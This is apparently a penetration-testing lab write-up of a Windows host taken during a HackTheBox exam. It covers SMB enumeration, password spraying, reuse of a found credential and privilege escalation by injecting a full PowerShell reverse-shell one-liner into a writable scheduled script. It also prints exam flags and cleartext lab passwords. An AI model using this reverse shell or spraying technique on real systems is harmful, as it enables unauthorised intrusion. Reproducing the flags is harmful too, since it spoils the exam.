---
title: "WIN02"
category: "labs"
tags: []
excerpt: ""
date: "2026-04-30"
---

---
## Target Information

<details class="callout callout-info">
<summary class="callout-title"><span class="callout-icon">ℹ</span><span>Target Information:</span></summary>
<div class="callout-body">

```
IP Address: (changed multiple times; not recorded during exam — use nmap at exam start)
Hostname:   WIN02.luminex.htb (inferred)
OS:         Windows
Platform:   HackTheBox CJCA Exam
```

</div>
</details>

---
## Timeline

<details class="callout callout-info">
<summary class="callout-title"><span class="callout-icon">ℹ</span><span>Timeline:</span></summary>
<div class="callout-body">

```
2026-04-25 — Nmap: SMB, RDP, WinRM identified
2026-04-25 — Null session SMB confirmed; backup user identified
2026-04-25 — SMB password spray; backup:gmb_ADN6wje9tra3qwf authenticated
2026-04-25 — Shell as backup via WMI/SMB exec; post-exploitation enumeration
2026-04-25 — Found MonitorFiles.ps1 — suspected scheduled execution as Administrator
2026-04-25 — Injected reverse shell into MonitorFiles.ps1; waited for execution
2026-04-25 — Script executed as Administrator; reverse shell received as root
```

</div>
</details>

---
## Enumeration

### Port Scan Results

<details class="callout callout-info">
<summary class="callout-title"><span class="callout-icon">ℹ</span><span>Port Scan Results:</span></summary>
<div class="callout-body">

```
nmap -oN WIN02-TCP-Ports -T5 -sT -p- -Pn <target-ip>

PORT      STATE SERVICE
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds (SMB)
3389/tcp  open  ms-wbt-server (RDP)
47001/tcp open  winrm
```

</div>
</details>

### Service Enumeration

<details class="callout callout-info">
<summary class="callout-title"><span class="callout-icon">ℹ</span><span>Service Enumeration:</span></summary>
<div class="callout-body">

```
# SMB null session enumeration
nxc smb <target-ip> -u '' -p '' --users
nxc smb <target-ip> -u guest -p '' --shares
# backup user identified via null session; confirmed valid account via SubStatus codes
```

</div>
</details>

---
## Foothold

### Vulnerability Identified

<details class="callout callout-info">
<summary class="callout-title"><span class="callout-icon">ℹ</span><span>Vulnerability Identified:</span></summary>
<div class="callout-body">

```
Credential reuse — backup:gmb_ADN6wje9tra3qwf recovered from /root/log_backup.sh
on NIX02 post-root. Valid local account on WIN02.
Approximately 689 NTLM spray attempts before success (automated spray against backup).
Initial shell obtained via WMI remote execution using the backup credential.
```

</div>
</details>

### Exploitation Steps

<details class="callout callout-info">
<summary class="callout-title"><span class="callout-icon">ℹ</span><span>Exploitation Steps:</span></summary>
<div class="callout-body">

```
# 1. Confirm backup credential over SMB
nxc smb <target-ip> -u backup -p 'gmb_ADN6wje9tra3qwf'

# 2. Remote command execution as backup via SMB/WMI
nxc smb <target-ip> -u backup -p 'gmb_ADN6wje9tra3qwf' -x whoami

# 3. Get interactive shell (WinRM or evil-winrm if port 47001 accessible)
evil-winrm -i <target-ip> -u backup -p 'gmb_ADN6wje9tra3qwf'
```

</div>
</details>

---
## Privilege Escalation

### Vector Identified

<details class="callout callout-info">
<summary class="callout-title"><span class="callout-icon">ℹ</span><span>Vector Identified:</span></summary>
<div class="callout-body">

```
MonitorFiles.ps1 — a PowerShell script that executes on a schedule under the
Administrator account. The script was found in a user-accessible location and
was writable by the backup user. The exact execution mechanism (scheduled task,
service, or WMI subscription) was unclear during the exam.

Injecting arbitrary commands into the script causes them to run as Administrator
when the script next fires.
```

</div>
</details>

### Steps Taken

<details class="callout callout-info">
<summary class="callout-title"><span class="callout-icon">ℹ</span><span>Steps Taken:</span></summary>
<div class="callout-body">

```
# 1. Locate MonitorFiles.ps1 via manual enumeration or winPEAS
# Typically found in C:\Users\Administrator\, C:\Scripts\, or similar

# 2. Inspect the script to understand its structure
type MonitorFiles.ps1

# 3. Append reverse shell to the script
Add-Content -Path MonitorFiles.ps1 -Value '$client = New-Object System.Net.Sockets.TCPClient("<attacker-ip>",<port>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'

# 4. Start listener
nc -lvnp <port>

# 5. Wait for MonitorFiles.ps1 to execute as Administrator
# Result: reverse shell as Administrator (root)
```

</div>
</details>

---
## Flags

<details class="callout callout-info">
<summary class="callout-title"><span class="callout-icon">ℹ</span><span>Flags:</span></summary>
<div class="callout-body">

```
User (backup):        577561d76f5d502daeabb2162118c725
Root (Administrator): 73842c0719e9207da6b9f7ee6e435ab5
```

</div>
</details>

---
## Loot

<details class="callout callout-info">
<summary class="callout-title"><span class="callout-icon">ℹ</span><span>Loot:</span></summary>
<div class="callout-body">

```
backup:gmb_ADN6wje9tra3qwf     — local user, SMB/WinRM access
Administrator password changed to wF&Z226m9Y^g#NDWJT via MonitorFiles.ps1 injection
```

</div>
</details>

---
## Rabbit Holes

<details class="callout callout-info">
<summary class="callout-title"><span class="callout-icon">ℹ</span><span>Rabbit Holes:</span></summary>
<div class="callout-body">

```
- Could not determine how MonitorFiles.ps1 was being executed (scheduled task?
service? WMI subscription?). Spent time trying to enumerate the trigger before
deciding the script looked important enough to inject into and wait.
Lesson: if a script runs as a privileged user and is writable — inject and wait.
Do not need to understand the exact trigger mechanism to exploit it.

- Did not find backup credentials on NIX02 before moving here. Had to backtrack to
NIX02 to find them in /root/log_backup.sh.
```

</div>
</details>

---
## Lessons Learned

<details class="callout callout-info">
<summary class="callout-title"><span class="callout-icon">ℹ</span><span>Lessons Learned:</span></summary>
<div class="callout-body">

```
- When you find a script that appears to run with elevated privileges, check if it is
writable — injection + patience beats fully understanding the execution chain.
- Read ALL of winPEAS/linpeas output. Scheduled tasks, writable scripts, and
misconfigured services are consistently present but easy to miss on first pass.
- Always check /root/ on every rooted Linux host for scripts containing credentials
before pivoting to the next target.
- Note to self: improve in-exam note-taking. Not recording WIN02 IP address meant
having to re-scan after resets instead of checking notes.
```

</div>
</details>

---
## Related Concepts
- [Windows Fundamentals](/knowledge/Operating-Systems/Windows/Windows-Fundamentals)
- [Windows Remote Management](/knowledge/Operating-Systems/Windows/Windows-Remote-Management)
- [SMB](/knowledge/Networking/SMB)
- [Windows PowerShell](/knowledge/Operating-Systems/Windows/Windows-PowerShell)

## Related Playbooks
- [Windows Pentest Playbook](/playbooks/Windows-Pentest-Playbook)

## Related Tools
- [NetExec](/tools/Enumeration/NetExec)
- [evil-winrm](/tools/Post-Exploitation/evil-winrm)
- [PEASS-ng](/tools/Post-Exploitation/PEASS-ng)
- [xfreerdp](/tools/Utilities/xfreerdp)
- [Nmap](/tools/Enumeration/Nmap)

---
## References / Images
- Initial SSH/Remote Access as backup
- User Flag
- Wondershare Blue Team Alert
- backup Credentials Found
- Root Flag
- Reverse Shell as Administrator
- MonitorFiles.ps1 Injection
